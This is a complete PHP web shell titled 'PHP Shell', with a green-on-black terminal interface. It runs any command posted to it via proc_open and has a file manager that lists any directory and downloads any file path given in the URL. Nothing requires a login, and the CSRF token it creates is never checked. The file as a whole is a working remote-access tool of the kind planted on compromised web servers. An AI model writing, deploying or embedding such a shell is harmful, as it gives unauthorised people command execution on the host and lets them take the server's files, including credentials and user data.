<?php
// Constants and settings
define('SHELL_VERSION', '1.3');
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Custom error handler
function error_handler($errno, $errstr, $errfile, $errline) {
    if (error_reporting() !== 0) {
        die("<!DOCTYPE html><html lang='en'><head><title>PHP Shell</title></head><body>
             <h1>Fatal Error!</h1><p><b>{$errstr}</b></p><p>in <b>{$errfile}</b>, line <b>{$errline}</b>.</p></body></html>");
    }
}
set_error_handler('error_handler');

// Initialize session and CSRF token
session_start();
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = [];
}

// Command execution
function execute_command($cmd, $cwd) {
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"]
    ];
    $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
    $output = "";
    if (is_resource($process)) {
        while ($f = fgets($pipes[1])) {
            $output .= htmlspecialchars($f);
        }
        fclose($pipes[1]);
        while ($f = fgets($pipes[2])) {
            $output .= htmlspecialchars($f);
        }
        fclose($pipes[2]);
        proc_close($process);
    }
    return $output;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['command'])) {
        $cmd = $_POST['command'];
        $cwd = $_SESSION['cwd'] ?? getcwd();
        $output = execute_command($cmd, $cwd);
        $_SESSION['output'] = ($_SESSION['output'] ?? '') . "\n$ " . htmlspecialchars($cmd) . "\n" . $output;
        $_SESSION['command_history'][] = $cmd;
    }
}

// File manager functionality
function list_directory($dir) {
    $files = scandir($dir);
    $output = '<ul>';
    if ($dir !== '/') {
        $output .= '<li><a href="?dir=' . urlencode(dirname($dir)) . '">..</a></li>';
    }
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            $output .= '<li><a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a></li>';
        } else {
            $output .= '<li><a href="?download=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a></li>';
        }
    }
    $output .= '</ul>';
    return $output;
}

if (isset($_GET['dir'])) {
    $cwd = $_GET['dir'];
} else {
    $cwd = getcwd();
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// HTML and CSS for the interface
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Shell</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #33ff33;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }
        .terminal {
            width: calc(100% - 300px);
            height: 100%;
            background-color: #000;
            padding: 10px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            transition: width 0.3s;
        }
        .output {
            flex-grow: 1;
            overflow-y: auto;
            white-space: pre-wrap;
            padding-bottom: 10px;
            color: #33ff33;
        }
        .input-command {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #33ff33;
            background-color: #000;
            color: #33ff33;
            font-family: 'Courier New', Courier, monospace;
        }
        .file-manager {
            width: 300px;
            height: 100%;
            background-color: #111;
            padding: 10px;
            box-sizing: border-box;
            overflow-y: auto;
            border-left: 1px solid #333;
            transition: width 0.3s;
            position: relative;
        }
        .file-manager ul {
            list-style: none;
            padding: 0;
        }
        .file-manager li {
            margin: 5px 0;
        }
        .file-manager a {
            color: #33ff33;
            text-decoration: none;
        }
        .file-manager a:hover {
            text-decoration: underline;
        }
        .resizer {
            width: 5px;
            height: 100%;
            background: #333;
            cursor: ew-resize;
            position: absolute;
            left: -5px;
            top: 0;
        }
        .toggle-button {
            width: 20px;
            height: 20px;
            background: #333;
            color: #33ff33;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: absolute;
            right: -20px;
            top: 10px;
            z-index: 1;
        }
        .collapsed .file-manager {
            width: 0;
            padding: 0;
            border: none;
        }
        .collapsed .terminal {
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="terminal" id="terminal">
        <div class="output" id="output"><?php echo isset($_SESSION['output']) ? $_SESSION['output'] : ''; ?></div>
        <form method="POST" id="commandForm">
            <input type="text" name="command" class="input-command" autofocus autocomplete="off">
        </form>
    </div>
    <div class="file-manager" id="fileManager">
        <div class="resizer" id="resizer"></div>
        <div class="toggle-button" id="toggleButton">&lt;</div>
        <?php echo list_directory($cwd); ?>
    </div>
    <script>
        const outputDiv = document.getElementById('output');
        outputDiv.scrollTop = outputDiv.scrollHeight;

        document.querySelector('form#commandForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            fetch('', {
                method: 'POST',
                body: formData
            }).then(response => response.text()).then(html => {
                document.open();
                document.write(html);
                document.close();
            });
        });

        document.querySelector('.input-command').addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                document.getElementById('commandForm').submit();
            }
        });

        let commandHistory = <?php echo json_encode($_SESSION['command_history']); ?>;
        let historyIndex = commandHistory.length;

        document.querySelector('.input-command').addEventListener('keydown', function(event) {
            if (event.key === 'ArrowUp') {
                if (historyIndex > 0) {
                    historyIndex--;
                    event.target.value = commandHistory[historyIndex];
                }
            } else if (event.key === 'ArrowDown') {
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    event.target.value = commandHistory[historyIndex];
                } else {
                    historyIndex = commandHistory.length;
                    event.target.value = '';
                }
            }
        });

        // Resizable pane functionality
        const resizer = document.getElementById('resizer');
        const terminal = document.getElementById('terminal');
        const fileManager = document.getElementById('fileManager');
        const toggleButton = document.getElementById('toggleButton');
        let isResizing = false;

        resizer.addEventListener('mousedown', function(e) {
            isResizing = true;
            document.body.style.cursor = 'ew-resize';
        });

        document.addEventListener('mousemove', function(e) {
            if (!isResizing) return;
            const offsetRight = document.body.offsetWidth - e.clientX;
            if (offsetRight > 100 && offsetRight < document.body.offsetWidth - 100) {
                terminal.style.width = `calc(100% - ${offsetRight}px)`;
                fileManager.style.width = `${offsetRight}px`;
            }
        });

        document.addEventListener('mouseup', function() {
            isResizing = false;
            document.body.style.cursor = 'default';
        });

        toggleButton.addEventListener('click', function() {
            fileManager.classList.toggle('collapsed');
            if (fileManager.classList.contains('collapsed')) {
                toggleButton.innerHTML = '&gt;';
            } else {
                toggleButton.innerHTML = '&lt;';
            }
        });
    </script>
</body>
</html>

